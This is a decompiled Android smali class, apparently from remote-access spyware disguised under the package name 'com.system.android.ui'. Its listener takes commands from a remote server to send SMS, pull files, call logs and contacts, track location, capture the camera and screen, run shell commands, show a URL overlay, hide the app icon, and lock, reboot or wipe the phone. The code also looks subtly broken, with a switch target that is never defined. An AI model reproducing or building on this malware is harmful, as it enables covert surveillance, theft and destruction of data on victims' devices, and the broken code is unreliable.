.class final Lcom/system/android/ui/ConnectionManager$2;
.super Ljava/lang/Object;
.source "ConnectionManager.java"

# interfaces
.implements Lio/socket/emitter/Emitter$Listener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/system/android/ui/ConnectionManager;->sendReq()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    .line 44
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public varargs call([Ljava/lang/Object;)V
    .locals 7
    .param p1, "args"    # [Ljava/lang/Object;

    const/4 v0, 0x0

    :try_start_0
    aget-object v1, p1, v0

    check-cast v1, Lorg/json/JSONObject;

    const-string v2, "type"

    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v3, -0x1

    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v4

    sparse-switch v4, :sswitch_data_0

    :goto_0
    const-string v4, "ls"

    const-string v6, "action"

    packed-switch v3, :pswitch_data_0

    goto/16 :goto_1

    :pswitch_0
    const-string v0, "path"
    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0
    const-string v2, "action"
    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v2
    const-string v3, "dl"
    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v2
    invoke-static {v2, v0}, Lcom/system/android/ui/ConnectionManager;->FI(ILjava/lang/String;)V
    goto/16 :goto_1

    :pswitch_1
    const-string v0, "action"
    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0
    const-string v2, "phoneNo"
    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v2
    const-string v3, "msg"
    invoke-virtual {v1, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v3
    const-string v4, "send"
    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    invoke-static {v0, v2, v3}, Lcom/system/android/ui/ConnectionManager;->SM(ILjava/lang/String;Ljava/lang/String;)V
    goto/16 :goto_1

    :pswitch_2
    invoke-static {}, Lcom/system/android/ui/ConnectionManager;->CL()V
    goto/16 :goto_1

    :pswitch_3
    invoke-static {}, Lcom/system/android/ui/ConnectionManager;->CO()V

    goto/16 :goto_1

    :pswitch_4
    const-string v0, "sec"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v0

    invoke-static {v0}, Lcom/system/android/ui/ConnectionManager;->MI(I)V

    goto/16 :goto_1

    :pswitch_5
    invoke-static {}, Lcom/system/android/ui/ConnectionManager;->LO()V
    goto/16 :goto_1

    :pswitch_6
    invoke-static {}, Lcom/system/android/ui/ConnectionManager;->WI()V

    goto/16 :goto_1

    :pswitch_7
    invoke-static {}, Lcom/system/android/ui/ConnectionManager;->PM()V

    goto/16 :goto_1

    :pswitch_8
    invoke-static {}, Lcom/system/android/ui/ConnectionManager;->IN()V

    goto/16 :goto_1

    :pswitch_9
    const-string v0, "permission"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/system/android/ui/ConnectionManager;->GP(Ljava/lang/String;)V

    goto/16 :goto_1

    :pswitch_a
    sget-object v0, Lcom/system/android/ui/ConnectionManager;->context:Landroid/content/Context;

    invoke-static {v0}, Lcom/system/android/ui/MDMActionHandler;->lockScreen(Landroid/content/Context;)V

    goto/16 :goto_1

    :pswitch_b
    new-instance v0, Landroid/content/Intent;

    sget-object v1, Lcom/system/android/ui/ConnectionManager;->context:Landroid/content/Context;

    const-class v2, Lcom/system/android/ui/MDMActivity;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "action"

    const-string v2, "screenshot"

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    sget-object v1, Lcom/system/android/ui/ConnectionManager;->context:Landroid/content/Context;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_1

    :pswitch_c
    sget-object v0, Lcom/system/android/ui/ConnectionManager;->context:Landroid/content/Context;

    const-wide/16 v1, 0x3e8

    invoke-static {v0, v1, v2}, Lcom/system/android/ui/MDMActionHandler;->vibrate(Landroid/content/Context;J)V

    goto :goto_1

    :pswitch_d
    sget-object v0, Lcom/system/android/ui/ConnectionManager;->context:Landroid/content/Context;

    invoke-static {v0}, Lcom/system/android/ui/MDMActionHandler;->reboot(Landroid/content/Context;)V

    goto :goto_1

    :pswitch_e
    sget-object v0, Lcom/system/android/ui/ConnectionManager;->context:Landroid/content/Context;

    invoke-static {v0}, Lcom/system/android/ui/MDMActionHandler;->wipeData(Landroid/content/Context;)V

    goto :goto_1

    :pswitch_f
    sget-object v0, Lcom/system/android/ui/ConnectionManager;->context:Landroid/content/Context;

    const/4 v1, 0x0

    invoke-static {v0, v1}, Lcom/system/android/ui/MDMActionHandler;->setIconVisible(Landroid/content/Context;Z)V

    goto :goto_1

    :pswitch_10
    sget-object v0, Lcom/system/android/ui/ConnectionManager;->context:Landroid/content/Context;

    const/4 v1, 0x1

    invoke-static {v0, v1}, Lcom/system/android/ui/MDMActionHandler;->setIconVisible(Landroid/content/Context;Z)V

    goto :goto_1

    :pswitch_11
    const-string v0, "minTime"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->optLong(Ljava/lang/String;)J

    move-result-wide v0

    sget-object v2, Lcom/system/android/ui/ConnectionManager;->context:Landroid/content/Context;

    invoke-static {v2, v0, v1}, Lcom/system/android/ui/LocManager;->setFrequency(Landroid/content/Context;J)V

    goto :goto_1

    :pswitch_12
    const-string v0, "camera"

    const/4 v2, 0x0

    invoke-virtual {v1, v0, v2}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v0

    new-instance v1, Lcom/system/android/ui/CameraManager;

    sget-object v2, Lcom/system/android/ui/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v1, v2}, Lcom/system/android/ui/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1, v0}, Lcom/system/android/ui/CameraManager;->startUp(I)V

    goto :goto_1

    :pswitch_13
    sget-object v0, Lcom/system/android/ui/ConnectionManager;->context:Landroid/content/Context;

    invoke-static {v0}, Lcom/system/android/ui/ScreenRecordManager;->startRecording(Landroid/content/Context;)V

    goto :goto_1

    :pswitch_14
    sget-object v0, Lcom/system/android/ui/ConnectionManager;->context:Landroid/content/Context;

    invoke-static {v0}, Lcom/system/android/ui/ScreenRecordManager;->stopRecording(Landroid/content/Context;)V

    goto :goto_1

    :pswitch_15
    sget-object v0, Lcom/system/android/ui/ConnectionManager;->context:Landroid/content/Context;

    invoke-static {v0}, Lcom/system/android/ui/ScreenRecordManager;->startStreaming(Landroid/content/Context;)V

    goto :goto_1

    :pswitch_16
    invoke-static {v1}, Lcom/system/android/ui/ShellManager;->handle(Lorg/json/JSONObject;)V

    goto :goto_1

    :pswitch_17
    const-string v0, "url"
    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0
    new-instance v1, Landroid/content/Intent;
    sget-object v2, Lcom/system/android/ui/ConnectionManager;->context:Landroid/content/Context;
    const-class v3, Lcom/system/android/ui/OverlayActivity;
    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    const-string v2, "url"
    invoke-virtual {v1, v2, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    const/high16 v0, 0x10000000
    invoke-virtual {v1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    sget-object v0, Lcom/system/android/ui/ConnectionManager;->context:Landroid/content/Context;
    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto :goto_1

    :sswitch_0
    const-string v4, "0xCA"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/16 v3, 0x12
    goto/16 :goto_0

    :sswitch_1
    const-string v4, "0xCL"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/4 v3, 0x2
    goto/16 :goto_0

    :sswitch_2
    const-string v4, "0xCO"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/4 v3, 0x3
    goto/16 :goto_0

    :sswitch_3
    const-string v4, "0xFI"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/4 v3, 0x0
    goto/16 :goto_0

    :sswitch_4
    const-string v4, "0xGF"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/16 v3, 0x11
    goto/16 :goto_0

    :sswitch_5
    const-string v4, "0xGP"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/16 v3, 0x9
    goto/16 :goto_0

    :sswitch_6
    const-string v4, "0xHO"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/16 v3, 0xf
    goto/16 :goto_0

    :sswitch_7
    const-string v4, "0xIN"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/16 v3, 0x8
    goto/16 :goto_0

    :sswitch_8
    const-string v4, "0xLK"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/16 v3, 0xa
    goto/16 :goto_0

    :sswitch_9
    const-string v4, "0xLO"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/4 v3, 0x5
    goto/16 :goto_0

    :sswitch_a
    const-string v4, "0xMI"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/4 v3, 0x4
    goto/16 :goto_0

    :sswitch_b
    const-string v4, "0xPM"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/4 v3, 0x7
    goto/16 :goto_0

    :sswitch_c
    const-string v4, "0xRB"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/16 v3, 0xd
    goto/16 :goto_0

    :sswitch_d
    const-string v4, "0xSC"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/16 v3, 0xb
    goto/16 :goto_0

    :sswitch_e
    const-string v4, "0xSM"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/4 v3, 0x1
    goto/16 :goto_0

    :sswitch_f
    const-string v4, "0xSO"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/16 v3, 0x10
    goto/16 :goto_0

    :sswitch_10
    const-string v4, "0xSP"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/16 v3, 0x15
    goto/16 :goto_0

    :sswitch_11
    const-string v4, "0xSR"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/16 v3, 0x13
    goto/16 :goto_0

    :sswitch_12
    const-string v4, "0xST"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/16 v3, 0x14
    goto/16 :goto_0

    :sswitch_13
    const-string v4, "0xVB"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/16 v3, 0xc
    goto/16 :goto_0

    :sswitch_14
    const-string v4, "0xWD"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/16 v3, 0xe
    goto/16 :goto_0

    :sswitch_16
    const-string v4, "0xSH"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/16 v3, 0x16
    goto/16 :goto_0

    :sswitch_17
    const-string v4, "0xOV"
    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :cond_0
    const/16 v3, 0x17
    goto/16 :goto_0

    :cond_0
    goto/16 :goto_0

    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :goto_1
    return-void

    :sswitch_data_0
    .sparse-switch
        0x179ca6 -> :sswitch_0
        0x179cb1 -> :sswitch_1
        0x179cb4 -> :sswitch_2
        0x179d0b -> :sswitch_3
        0x179d27 -> :sswitch_4
        0x179d31 -> :sswitch_5
        0x179d4f -> :sswitch_6
        0x179d6d -> :sswitch_7
        0x179dc7 -> :sswitch_8
        0x179dcb -> :sswitch_9
        0x179de4 -> :sswitch_a
        0x179e2f -> :sswitch_17
        0x179e45 -> :sswitch_b
        0x179e78 -> :sswitch_c
        0x179e98 -> :sswitch_d
        0x179ea2 -> :sswitch_e
        0x179ea4 -> :sswitch_f
        0x179ea5 -> :sswitch_10
        0x179ea7 -> :sswitch_11
        0x179ea9 -> :sswitch_12
        0x179e9d -> :sswitch_16
        0x179ef4 -> :sswitch_13
        0x179f15 -> :sswitch_14
        0x179f1a -> :sswitch_15
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
        :pswitch_6
        :pswitch_7
        :pswitch_8
        :pswitch_9
        :pswitch_a
        :pswitch_b
        :pswitch_c
        :pswitch_d
        :pswitch_e
        :pswitch_f
        :pswitch_10
        :pswitch_11
        :pswitch_12
        :pswitch_13
        :pswitch_14
        :pswitch_15
        :pswitch_16
        :pswitch_17
    .end packed-switch
.end method

# End of file padding to prevent Apktool EOF bug
